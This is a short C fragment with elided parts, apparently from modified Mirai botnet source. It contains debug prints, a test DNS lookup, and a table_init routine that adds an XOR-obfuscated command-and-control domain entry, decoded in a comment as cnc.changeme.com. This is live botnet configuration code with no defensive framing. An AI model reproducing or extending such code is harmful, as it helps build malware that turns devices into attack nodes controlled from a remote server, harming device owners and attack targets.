...
char* get_domain() {
    printf("bbb\n");
    struct resolv_entries* a = resolv_lookup("www.testsxy.c");
    printf("[resolv get_domain] Found IP address: %08x\n", a->addrs);
    return "www";
}
void table_init(void)
{
    ...
    char *b = get_name();
    printf("name:%s\n", b);
    add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F", 30); // cnc.changeme.com
